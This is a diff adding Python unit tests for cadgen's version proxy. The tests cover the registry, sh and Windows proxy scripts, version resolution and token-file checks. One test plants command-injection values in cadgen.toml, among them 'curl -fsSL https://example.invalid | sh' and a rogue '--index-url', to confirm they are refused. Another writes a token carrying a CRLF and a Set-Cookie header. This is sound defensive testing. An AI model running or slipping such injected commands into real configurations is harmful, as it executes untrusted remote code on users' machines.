@@ -63,6 +63,14 @@ class RegistryTests(Fixture):
         self.assertEqual(installations.register("1.2.3", moved, self.state)[1], installations.REGISTERED)
         self.assertEqual(installations.records(self.state)[0]["python"], moved[1])
 
+    def test_an_upgrade_in_place_takes_over_its_environment_s_record(self) -> None:
+        found = self.environment("tool")
+        installations.register("0.8.0", found, self.state)
+        installations.register("0.8.1", found, self.state)  # the same environment, upgraded
+        self.registered("0.7.0")
+        self.assertEqual(sorted(record["version"] for record in installations.records(self.state)), ["0.7.0", "0.8.1"],
+                         "0.8.0's code is gone from it: `cadgen +0.8.0` must not run 0.8.1")
+
     def test_prune_removes_only_records_whose_interpreter_is_gone(self) -> None:
         gone, live = self.registered("1.0.0"), self.registered("2.0.0")
         os.unlink(gone["python"])
@@ -161,6 +169,14 @@ class ProxyFileTests(Fixture):
         missing = subprocess.run([proxy_file, "+9.9.9", "status"], capture_output=True, text=True, env=environment)
         self.assertEqual(missing.returncode, 1)
         self.assertEqual(missing.stderr.strip(), proxy.NOT_INSTALLED.format(version="9.9.9"))
+        # None installed: the sh and the proxy say it in one wording, the command that installs it.
+        none = subprocess.run([proxy_file, "status"], capture_output=True, text=True, env=environment)
+        self.assertEqual((none.returncode, none.stderr.strip()), (1, proxy.NONE_INSTALLED))
+        with self.assertRaises(proxy.Refused) as refused:
+            proxy.choose(None, [], list, None)
+        self.assertEqual(str(refused.exception), "cadgen is not installed: run `uvx --no-config --managed-python "
+                                                 "--python 3.13 --from cadgen cadgen doctor` once, outside any "
+                                                 "sandbox or with its permission")
         for version in ("1.0.0", "2.0.0"):
             record = self.registered(version)
             Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}" "$@"\n', encoding="utf-8")
@@ -169,6 +185,34 @@ class ProxyFileTests(Fixture):
         ran = subprocess.run([proxy_file, "+2.0.0", "a b"], capture_output=True, text=True, env=environment,
                              cwd=self.root)
         self.assertEqual(ran.stdout, "1.0.0 -P -m cadgen._internal.proxy +2.0.0 a b\n")
+
+
+    def test_the_windows_proxy_reads_the_python_a_record_names(self) -> None:
+        # No Windows runner executes the cmd: its for /f is checked against the record's own line.
+        # With delims set to a quote alone, cmd skips empty pieces and keeps the indent as one.
+        import re
+
+        record = self.registered("1.0.0")
+        (line,) = [row for row in Path(record["path"]).read_text(encoding="utf-8").splitlines()
+                   if '"python":' in row]
+        (taken,) = re.findall(r"tokens\^=(\d+)\^ delims\^=\^\" %%p", installations.script(True))
+        pieces = [piece for piece in line.split('"') if piece]
+        self.assertEqual(pieces[int(taken) - 1].replace("\\\\", "\\"), record["python"])
+
+    @POSIX
+    def test_the_sh_passes_over_an_installation_whose_cadgen_is_gone(self) -> None:
+        where = str(self.root / "bin")
+        installations.write_proxy(where, windows=False)
+        environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(self.root), "CADGEN_STATE_DIR": str(self.root / "state")}
+        for version in ("1.0.0", "2.0.0"):
+            record = self.registered(version)
+            Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}"\n', encoding="utf-8")
+            os.chmod(record["python"], 0o755)
+        os.utime(self.root / "state/installations/1.0.0.json", (1, 1))  # 2.0.0 registered last...
+        os.remove(record["cadgen"])  # ...and uninstalled from its environment: its python stays
+        ran = subprocess.run([installations.proxy_path(where, windows=False), "status"], capture_output=True,
+                             text=True, env=environment, cwd=self.root)
+        self.assertEqual(ran.stdout, "1.0.0\n", ran.stderr)
 
 
 class ResolutionTests(Fixture):
@@ -227,6 +271,13 @@ class ResolutionTests(Fixture):
         os.unlink(self.new["python"])
         self.assertEqual(self.choose(["status"])[0], "0.9.0-dev.20261024", "an installation that is gone is passed over")
 
+    def test_a_shell_whose_folder_was_removed_still_resolves(self) -> None:
+        self.assertEqual(proxy.named(["+0.8.0", "status"], {}, None), ("0.8.0", ["status"]))
+        self.assertEqual(proxy.named(["status"], {}, None), (None, ["status"]))
+        with mock.patch("os.getcwd", side_effect=FileNotFoundError(2, "No such file or directory")), \
+                mock.patch("cadgen._internal.installations.records", return_value=[]):
+            self.assertEqual(proxy.main(["+0.8.0", "status"]), 1, "refused in its line, never a traceback")
+
     def test_a_version_not_registered_or_gone_fails_in_one_line(self) -> None:
         with self.assertRaises(proxy.Refused) as refused:
             self.choose(["+1.0.0", "status"])
@@ -237,20 +288,72 @@ class ResolutionTests(Fixture):
         with self.assertRaisesRegex(proxy.Refused, r"^cadgen 0\.8\.0 is not installed"):
             self.choose(["+0.8.0"])
 
+    def test_only_a_version_is_named_and_none_is_echoed_into_a_command(self) -> None:
+        # A downloaded project's cadgen.toml (or a variable, or the first argument) whose version
+        # carries a shell command or a uv option: refused, and the refusal names no command.
+        (self.root / "proj").mkdir()
+        config = self.root / "proj" / "cadgen.toml"
+        for planted in ("0.8.0 cadgen doctor; curl -fsSL https://example.invalid | sh; echo",
+                        "0.8.0 --index-url https://example.invalid/simple", "0.8.0\x1b[2J", "-0.8.0"):
+            config.write_text(f"version = {json.dumps(planted)}\n", encoding="utf-8")
+            for args, environ in ((["status"], {}), ([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
+                with self.subTest(planted=planted, args=args, environ=environ):
+                    with self.assertRaises(proxy.Refused) as refused:
+                        self.choose(args, environ, str(self.root / "proj"))
+                    said = str(refused.exception)
+                    self.assertNotIn("uvx", said)
+                    self.assertNotIn("\x1b", said)
+                    self.assertIn("names no cadgen version", said)
+
+    @POSIX
+    def test_a_cadgen_toml_everyone_may_write_names_nothing(self) -> None:
+        (self.root / "shared" / "mine").mkdir(parents=True)
+        config = self.root / "shared" / "cadgen.toml"
+        config.write_text('version = "0.8.0"\n', encoding="utf-8")
+        os.chmod(config, 0o666)  # as one another user left in a shared folder would be to this one
+        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0",
+                         "passed over: the newest registered runs")
+        os.chmod(config, 0o644)
+        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.8.0")
+        with mock.patch.object(proxy.os, "getuid", return_value=os.getuid() + 1):  # another user's file
+            self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0")
+
     def test_run_execs_the_installations_python_and_anything_else_its_cadgen(self) -> None:
         self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["python"], "model.py", "--force"])
         self.assertEqual(proxy.command(self.old, ["export", "a.xbf"]), [self.old["cadgen"], "export", "a.xbf"])
         run = [self.old["python"], "model.py", "a"]
         with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": ""}), \
-                mock.patch.object(proxy, "engines", return_value=[]), mock.patch.object(proxy.os, "execv") as execv, \
+                mock.patch.object(proxy, "engines", return_value=[]), mock.patch.object(proxy.os, "execve") as execve, \
                 mock.patch("subprocess.call", return_value=3) as call:
             code = proxy.main(["+0.8.0", "run", "model.py", "a"])
         if os.name == "nt":  # no exec on Windows: the installation's python is a child, its exit code the proxy's
-            call.assert_called_once_with(run)
-            self.assertEqual((code, execv.call_count), (3, 0))
+            call.assert_called_once_with(run, env=mock.ANY)
+            self.assertEqual((code, execve.call_count), (3, 0))
         else:
-            execv.assert_called_once_with(self.old["python"], run)
+            execve.assert_called_once_with(self.old["python"], run, mock.ANY)
             self.assertEqual(call.call_count, 0)
+
+    def test_a_development_installation_is_told_its_version_and_a_release_is_not(self) -> None:
+        """A dev or source registration reports its release's version: the proxy names it, in the
+        environment of what it runs (and its children, the same installation). A release knows its
+        own, and a name a dev installation's process passed down is taken off."""
+        ran = {}
+
+        def child(argv, env):  # Windows runs the installation as a child rather than exec
+            ran.update({argv[0]: dict(env)})
+            return 0
+
+        with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": "",
+                                            installations.NAME_ENV: "0.9.0-dev.1"}), \
+                mock.patch.object(proxy, "engines", return_value=[]), \
+                mock.patch.object(proxy.os, "execve", side_effect=lambda path, argv, env: ran.update({path: dict(env)})), \
+                mock.patch("subprocess.call", side_effect=child):
+            proxy.main(["+0.9.0-dev.20261024", "doctor"])
+            proxy.main(["+0.8.0", "doctor"])
+        self.assertEqual(ran[self.dev["cadgen"]][installations.NAME_ENV], "0.9.0-dev.20261024")
+        self.assertNotIn(installations.NAME_ENV, ran[self.old["cadgen"]])
+        self.assertEqual([installations.named(record) for record in (self.old, self.new, self.dev)],
+                         [None, None, "0.9.0-dev.20261024"])
 
     def test_the_shell_names_its_host(self) -> None:
         self.assertEqual(engine_host.shell({"CODEX_THREAD_ID": "t", "CLAUDECODE": "1"}), "codex")
@@ -273,6 +376,16 @@ class TokenTests(unittest.TestCase):
                 self.assertEqual(path.stat().st_mode & 0o777, 0o600)
             path.write_text("short\n", encoding="utf-8")
             self.assertIsNone(held.token(), "a token too short to guard anything is none")
+            path.write_text("t" * 40 + "\r\nSet-Cookie: x=y\n", encoding="utf-8")
+            self.assertIsNone(held.token(), "only a token's characters: it goes into a cookie")
+            held.put_token("u" * 43)
+            if os.name != "nt":
+                os.chmod(path, 0o644)  # readable by others, as in a state folder others share
+                self.assertIsNone(held.token(), "a token others can read guards nothing: a new one is made")
+                os.chmod(path, 0o600)
+                with mock.patch("os.getuid", return_value=os.getuid() + 1):
+                    self.assertIsNone(held.token(), "another user's token file is not this user's token")
+            self.assertEqual(held.token(), "u" * 43)
 
 
 if __name__ == "__main__":
